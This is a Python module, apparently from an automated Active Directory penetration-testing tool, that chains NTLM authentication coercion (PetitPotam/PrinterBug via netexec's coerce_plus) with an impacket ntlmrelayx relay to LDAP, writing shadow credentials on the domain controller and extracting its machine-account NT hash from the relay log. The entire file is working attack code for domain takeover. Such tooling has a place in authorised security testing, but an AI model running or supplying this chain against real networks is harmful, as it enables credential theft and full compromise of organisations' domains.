"""NTLM relay + coercion (PetitPotam/PrinterBug variants).

STRICTLY --aggressive. Relays coerced authentications to LDAP (shadow
credentials / RBCD) or to AD CS web endpoints (ESC8). Requires a listener IP
reachable from the target; specify it with --listener or set it in config.
"""
from __future__ import annotations

import time
from pathlib import Path

from .base import BaseModule


class RelayModule(BaseModule):
    name = "relay"
    description = "Coerce authentication and relay it (NTLM relay)"

    def run(self, workdir: Path) -> dict:
        if not self.aggressive_enabled("ntlm_relay"):
            self.log.info("NTLM relay disabled (use --aggressive)")
            return {}

        auth = self._pick_auth()
        if not auth:
            return {}
        domain, user, pwd, nth = auth
        dc = self._dc()
        if not dc:
            return {}

        listener = self.config.get("general.listener_ip", "") or self._detect_ip()
        if not listener:
            self.log.warn("no listener IP; set --listener to relay")
            return {}

        self.log.info("relay listener: %s", listener)
        self._relay_shadow(workdir, domain, user, pwd, nth, dc, listener)
        return {"domain_admin": self.state.domain_admin_achieved}

    def _pick_auth(self):
        creds = self.state.usable_credentials()
        if not creds:
            return None
        c = creds[0]
        return (c.domain or self.state.domain, c.username, c.password, c.nthash)

    def _dc(self) -> str | None:
        return (self.state.domain_controllers or [None])[0]

    def _detect_ip(self) -> str:
        res = self.runner.run(["hostname", "-I"], timeout=30, silent=True)
        first = res.stdout.split()[0] if res.stdout.split() else ""
        return first

    # ------------------------------------------------------------------
    def _relay_shadow(self, workdir, domain, user, pwd, nth, dc, listener) -> None:
        """Relay the DC's auth to LDAP and write shadow credentials on it."""
        log_file = str(workdir / "relay.log")
        relay = self.runner.resolve("ntlmrelayx", prefix="impacket-")
        cmd = [relay, "-t", f"ldap://{dc}", "--shadow-credentials",
               "--shadow-target", f"{dc}$", "-smb2support",
               "-of", str(workdir)]
        proc = self.runner.popen(cmd, log_file=log_file)
        try:
            time.sleep(4)
            self._coerce(dc, user, pwd, nth, listener)
            time.sleep(6)
            result = Path(log_file).read_text(encoding="utf-8", errors="replace")
            import re
            m = re.search(
                r"Got hash for '[^']+':\s*(?:[0-9a-fA-F]{32}:)?([0-9a-fA-F]{32})",
                result)
            if m:
                nth_dc = m.group(1)
                self.state.add_credential(
                    username=f"{dc}$", nthash=nth_dc, domain=domain,
                    source="relay-shadow-credentials")
                self.log_finding(
                    "critical", "Shadow credentials via NTLM relay",
                    f"Recovered {dc}$ NT hash: {nth_dc}",
                    technique="NTLM Relay (Shadow Credentials)")
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except Exception:
                proc.kill()

    def _coerce(self, target, user, pwd, nth, listener) -> None:
        """Force the target to authenticate to our listener via coerce_plus."""
        args = [self.nxc_bin(), "smb", target]
        if nth:
            args += ["-u", user, "-H", nth]
        else:
            args += ["-u", user, "-p", pwd or ""]
        args += ["-M", "coerce_plus", "-o", f"LISTENER={listener}"]
        self.runner.run(args, timeout=180, silent=True)
